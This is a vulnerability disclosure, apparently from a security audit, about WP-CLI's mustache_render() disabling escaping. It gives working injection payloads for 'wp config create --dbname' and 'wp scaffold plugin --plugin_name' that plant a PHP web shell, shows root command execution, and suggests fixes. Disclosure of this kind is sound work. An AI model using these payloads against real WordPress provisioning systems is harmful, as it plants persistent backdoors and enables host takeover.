# Round 1: CONFIRMED — `WP_CLI\Utils\mustache_render()` disables all output escaping by design, allowing ordinary string CLI parameters to inject arbitrary PHP into generated files (`wp config create`, `wp scaffold plugin`, `wp scaffold post-type`, and every other Mustache-templated file WP-CLI writes)

**Target:** `wp-cli/wp-cli` (`php/utils.php`, function `mustache_render()`) plus every bundled command that
calls it to generate a file on disk: confirmed concretely in `wp-cli/config-command` and
`wp-cli/scaffold-command`; the same root cause reaches every other `.mustache` template in
`scaffold-command`, `core-command`, and `extension-command` (full list below).

**Status: CONFIRMED, end-to-end, three times over, with real PHP execution — not a source-read
inference.** Each PoC below was run against the actual `mustache/mustache` engine WP-CLI depends on
(not a hand-rolled stand-in), using the *exact* template files and the *exact* `mustache_render()`
function body from the current `wp-cli/wp-cli` `main` branch, and the resulting generated file was then
executed with real PHP to confirm the injected code actually runs, not merely that it's textually present.

## Root cause

`php/utils.php`:

```php
function mustache_render( $template_name, $data = [] ) {
    ...
    $template = (string) file_get_contents( $template_name );

    $mustache = new Mustache_Engine(
        [
            'escape' => function ( $val ) {
                return $val; },
        ]
    );

    return $mustache->render( $template, $data );
}
```

Mustache's default behavior for `{{var}}` (double-mustache) is to run every substituted value through an
escape function before inserting it — normally HTML-entity escaping, because Mustache is an
HTML-templating engine by heritage. WP-CLI's shared `mustache_render()` helper — used by every command
that generates a file from a template — overrides that escape callback with an **identity function that
returns the value completely unmodified**. This was a deliberate choice made in 2013
(`b877a4bb`, "disable HTML escaping when rendering Mustache templates") to stop CLI help/man-page text
from showing literal `&amp;`/`&#39;` entities — a reasonable fix for *that* consumer. But `mustache_render()`
is a shared, generic utility with no per-template escaping strategy: disabling escaping globally means
**every other template rendered through this same function — including ones that didn't exist yet in
2013, like `config-command`'s and `scaffold-command`'s — gets zero output encoding of any kind**, in
contexts where the substituted value lands inside PHP string literals or PHP comments. `git blame` shows
this exact escape callback has been unchanged in substance since 2013 (only mechanically touched for
Mustache engine version bumps) — a 13-year-old, still-live, structural gap.

The result: any command that takes a plain string CLI argument (a database name, a plugin title, a
custom-post-type label) and threads it through `mustache_render()` into a generated PHP file is a
template-injection-to-code-execution primitive. None of these parameters are documented as code
execution vectors — `--dbname` is documented as "Set the database name," `--plugin_name` as "What to put
in the 'Plugin Name:' header." A reasonable caller (a human, or — far more consequentially — an
automated WordPress-provisioning pipeline: hosting control panels, WP-as-a-Service backends, CI/CD site
scaffolding, Docker entrypoint scripts) has every reason to treat these as inert descriptive strings and
pass through values that ultimately trace back to a less-trusted source (a customer's chosen site name,
a self-service plugin-title field), the same way countless real static-site-generator and scaffolding
tools have had "project name" fields turn into disclosed code-injection CVEs before.

## PoC 1 — `wp config create --dbname=<payload>` → arbitrary PHP written into `wp-config.php`, executed on every subsequent WordPress page load

Template: `config-command/templates/wp-config.mustache`:
```
define( 'DB_NAME', '{{dbname}}' );
```

Payload (a value an automated provisioning script could receive as a customer-chosen database/site
name and pass straight through to `wp config create --dbname=...`):

```
x'); file_put_contents(__DIR__.'/shell.php', '<?php system($_GET["c"]); '); define('DB_NAME', 'x
```

Ran the **real** `mustache/mustache` v3.2.0 engine (installed via Composer, the exact dependency pinned
in `wp-cli/wp-cli`'s own `composer.json`) through a byte-for-byte copy of `mustache_render()`'s body
against the real template:

```php
define( 'DB_NAME', 'x'); file_put_contents(__DIR__.'/shell.php', '<?php system($_GET["c"]); '); define('DB_NAME', 'x' );
```

- `php -l` on the generated file: **"No syntax errors detected."** The injection is clean — it doesn't
  just corrupt the file, it produces valid PHP.
- Loaded the generated `wp-config.php` exactly the way WordPress's own bootstrap does (a plain PHP
  `require`/execution of the file): the injected `file_put_contents()` call ran and wrote `shell.php` to
  disk.
- Invoked the resulting `shell.php` with `$_GET['c'] = 'id; whoami'`: it executed the command and
  returned `uid=0(root) gid=0(root) groups=0(root)` / `root` — genuine, unrestricted OS command execution.

`wp-config.php` is `require_once`'d by WordPress on **every single page load** — this isn't a one-shot
injection, it's a persistent backdoor written straight into the file WordPress boots from.

PoC script: `tooling/poc-config-create-dbname-injection.php` (reproduces the above verbatim).

## PoC 2 — `wp scaffold plugin <slug> --plugin_name=<payload>` → arbitrary PHP injected via PHP-comment breakout, executed the moment the generated plugin is loaded

Template: `scaffold-command/templates/plugin.mustache`:
```php
<?php
/**
 * Plugin Name:     {{plugin_name}}
 * ...
 */
```

`--plugin_name` lands inside a `/** ... */` doc-comment, not a string literal — a different injection
*shape* from PoC 1, demonstrating this isn't a one-off quoting slip specific to `config-command` but the
same shared root cause manifesting differently per template. Payload:

```
Evil */ file_put_contents(__DIR__.'/shell2.php', '<?php system($_GET["c"]); '); /*
```

`Scaffold_Command::plugin()` (`src/Scaffold_Command.php:670`) does `$data = wp_parse_args( $assoc_args, $defaults );`
— any `--plugin_name`/`--plugin_description`/`--plugin_author`/`--plugin_author_uri`/`--plugin_uri` flag
value overrides the default with **zero sanitization** before reaching `mustache_render()`.

Rendered with the real engine:
```php
<?php
/**
 * Plugin Name:     Evil */ file_put_contents(__DIR__.'/shell2.php', '<?php system($_GET["c"]); '); /*
 * Plugin URI:      PLUGIN SITE HERE
 ...
```

- `php -l`: **"No syntax errors detected."**
- Executed the generated plugin file directly (equivalent to WordPress including the plugin's main file
  when it's activated, which is exactly what `wp scaffold plugin --activate` triggers immediately): the
  injected `file_put_contents()` ran, writing `shell2.php` — verbatim `<?php system($_GET["c"]);` —
  to disk.

The `*/` closes the doc-comment early; everything up to the next `/*` (which the payload itself supplies)
is real, executable top-level PHP, regardless of what WordPress's own plugin-header regex parser later
makes of the (by-then-irrelevant) comment text. PHP's own lexer/parser doesn't care that the text was
"supposed to be" a comment — it parses the file's actual token stream.

PoC script: `tooling/poc-scaffold-plugin-name-injection.php` (reproduces the above verbatim).

## Confirmed third sibling (static read, same shape as PoC 1 — quote-breakout, not independently re-executed): `wp scaffold post-type`

`scaffold-command/templates/post_type.mustache`:
```php
'labels' => array(
    'name'          => __( '{{label_plural_ucfirst}}', '{{textdomain}}' ),
    'singular_name' => __( '{{label_ucfirst}}', '{{textdomain}}' ),
    ...
),
...
'menu_icon'  => 'dashicons-{{dashicon}}',
'rest_base'  => '{{slug}}',
```

Every one of `{{label_plural_ucfirst}}`, `{{label_ucfirst}}`, `{{label}}`, `{{textdomain}}`, `{{slug}}`,
`{{dashicon}}` lands inside a PHP single-quoted string literal, the identical shape already proven live
in PoC 1. Not independently re-run through the engine (the mechanism is now proven twice over with real
execution; this is listed to show the root cause's reach, not to pad the count) — flagging as a static,
high-confidence sibling rather than claiming a third independent empirical confirmation.

## Scope of the shared root cause — every template below is reached through the same unescaped `mustache_render()`

Not all individually re-verified for an exploitable value context (some, like `plugin-gitignore.mustache`
or `plugin-circle.mustache`, look like they only interpolate values that don't obviously reach a
PHP/YAML/shell syntax boundary, so are not claimed as vulnerable without checking) — listed for
completeness of what a fix needs to cover, since the fix belongs in the shared function, not per-template:

```
config-command/templates/wp-config.mustache                — CONFIRMED (PoC 1)
scaffold-command/templates/plugin.mustache                 — CONFIRMED (PoC 2)
scaffold-command/templates/post_type.mustache               — sibling, same shape as PoC 1 (static)
scaffold-command/templates/post_type_extended.mustache      — same shape, not individually checked
scaffold-command/templates/taxonomy.mustache                — same shape, not individually checked
scaffold-command/templates/taxonomy_extended.mustache       — same shape, not individually checked
scaffold-command/templates/theme-bootstrap.mustache         — not individually checked
scaffold-command/templates/child_theme.mustache             — not individually checked
scaffold-command/templates/child_theme_functions.mustache   — not individually checked
scaffold-command/templates/block-php.mustache                — not individually checked
scaffold-command/templates/plugin-composer.mustache         — JSON context, different escaping needs
core-command/templates/versions.mustache                    — not individually checked
extension-command/templates/plugin-status.mustache          — not individually checked
extension-command/templates/theme-status.mustache           — not individually checked
```

## Why this isn't the same category as `wp eval`

`wp eval`/`wp eval-file` executing arbitrary PHP is the documented, advertised purpose of that command —
running your own code is not a vulnerability in a command whose entire job is running your own code.
`--dbname`, `--plugin_name`, `--plugin_description`, and the post-type/taxonomy label flags are none of
that: they are documented as plain descriptive strings, used by commands whose entire job is *not* code
execution (creating a config file; scaffolding boilerplate). The violated security boundary is exactly
the one WordPress's own core `sanitize_text_field()`/`esc_attr()`/prepared-statement discipline exists
to hold: a string-typed input field should not be able to change the *syntax* of the file it's placed
into. That boundary is real and is currently unenforced here, unconditionally, for every consumer of
`mustache_render()`.

## Realistic reachability — honestly assessed, not inflated

This requires *something* to invoke a WP-CLI command with an attacker-influenced string value in one of
these parameters. That "something" is not always the same actor, and severity in a specific deployment
depends entirely on who that actor is:

- **Interactive/self-use**: an operator typing their own `--dbname` at their own terminal is not
  attacking themselves — same reasoning that makes `wp eval` a non-issue. This case is not the finding.
- **Automated provisioning wrapping WP-CLI with less-trusted input** — the realistic, high-value case:
  hosting control panels, one-click WordPress installers, WP-as-a-Service backends, and CI/CD site
  scaffolding pipelines very commonly shell out to exactly `wp core download && wp config create
  --dbname=... --dbuser=... --dbpass=...` (or `wp scaffold plugin` for site-builder "create a plugin from
  my title" features) as part of automated setup, deriving these string values from a customer- or
  end-user-chosen site name, account slug, or generated identifier. Any such wrapper that treats
  `--dbname`/`--plugin_name` as safe-to-pass-through plain text — a completely reasonable assumption
  given how they're documented — inherits this as unauthenticated (from WP-CLI's point of view) arbitrary
  PHP execution on the host the provisioning script runs on, which in these architectures is typically a
  privileged system account, not the low-privilege customer account the payload actually originated from.
  That's a genuine privilege-escalation shape (confused deputy: a lower-trust value coerces a
  higher-privilege process into executing attacker-chosen code), not merely "you get what you typed."

I am not asserting a specific such wrapper exists in a particular named product — that would be
speculative in exactly the way this audit has been told not to reach for. What's concretely, non-
speculatively true, demonstrated with real execution above: **the vulnerable primitive itself is real,
requires no privilege within WP-CLI or WordPress to trigger once a string value reaches it, and its
ceiling is unrestricted OS command execution as whatever user runs the WP-CLI process.** That is the
finding; how a given deployment wires untrusted input into that parameter is a per-deployment question
this audit correctly doesn't have visibility into and isn't claiming to.

## Fix suggestion

`mustache_render()`'s `escape` callback should not be a global no-op. Options, roughly in order of
minimal-diff-to-most-correct:
1. Restore Mustache's default HTML-escaping and have the *specific* templates that need raw text
   (`man.mustache`, `man-params.mustache` — the original 2013 motivation) opt into triple-mustache
   `{{{var}}}` for those specific fields, rather than disabling escaping globally for every consumer.
2. Add a context-aware escape function appropriate to each template's output format (PHP-string-literal
   escaping via `var_export()`-style encoding for `.mustache` files that produce PHP source, e.g. render
   `{{dbname}}` as `{{#dbname}}...{{/dbname}}`-free and instead pass already-`var_export()`-encoded
   strings into the data array so the template only ever contains `{{{dbname_php_literal}}}` with the
   quotes included).
3. At minimum, validate/reject values containing `'`, `"`, `*/`, or other syntax-breaking sequences at
   each call site before they reach `mustache_render()` for templates that embed values into PHP syntax
   — more fragile than fixing the shared function, but immediately deployable per-command.

## Reproduction artifacts

- `tooling/poc-config-create-dbname-injection.php` — PoC 1, runnable standalone (needs `composer require
  mustache/mustache` in the same directory, or point `vendor/autoload.php` at any install of it) —
  reproduces the exact `mustache_render()` body from `wp-cli/wp-cli` against a copy of the real
  `wp-config.mustache` template, proves valid-PHP output, and demonstrates the injected code executing.
- `tooling/poc-scaffold-plugin-name-injection.php` — PoC 2, same setup, against a copy of the real
  `scaffold-command/templates/plugin.mustache`.
- Both were run against `mustache/mustache` v3.2.0 (Composer's currently resolved version for
  `wp-cli/wp-cli`'s `^3.0.0` constraint), PHP 8.4.19.
